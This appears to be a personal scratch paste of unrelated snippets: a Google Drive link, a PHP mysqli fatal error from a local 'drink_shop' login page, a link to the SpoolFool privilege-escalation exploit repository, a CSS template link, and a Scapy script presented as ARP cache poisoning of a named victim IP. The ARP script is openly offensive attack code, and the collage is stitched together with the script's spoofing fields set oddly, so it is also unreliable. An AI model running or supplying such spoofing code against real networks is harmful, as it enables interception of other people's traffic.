https://drive.google.com/file/d/1olXbSWB_d-HK1BIC8r3b8EyrfPgKXD8o/view?usp=sharing

Fatal error: Uncaught TypeError: mysqli_fetch_assoc(): Argument #1 ($result) must be of type mysqli_result, bool given in C:\xampp\htdocs\drink_shop\pages\manage_login\check_login.php:14 Stack trace: #0 C:\xampp\htdocs\drink_shop\pages\manage_login\check_login.php(14): mysqli_fetch_assoc(false) #1 {main} thrown in C:\xampp\htdocs\drink_shop\pages\manage_login\check_login.php on line 14

https://github.com/ly4k/SpoolFool

https://www.free-css.com/free-css-templates/page291/drool

from scapy.all import Ether, ARP, sendp

# Define target IP address and MAC address
target_ip = "10.62.2.52"  # Victim's IP address
target_mac = "08:00:27:XX:XX:XX"  # Victim's MAC address (replace with actual MAC)

# Define attacker's MAC and IP address
attacker_mac = "AA:BB:CC:DD:EE:FF"  # Attacker's MAC address
attacker_ip = "10.62.2.54"  # Attacker's IP address

# Create an ARP reply packet to poison the victim's ARP cache
arp_reply = Ether(dst=target_mac)/ARP(op="is-at", psrc=attacker_ip, hwsrc=attacker_mac, pdst=target_ip)

# Send the ARP reply packet to perform ARP poisoning
sendp(arp_reply, iface="your_network_interface")  # Replace "your_network_interface" with your network interface
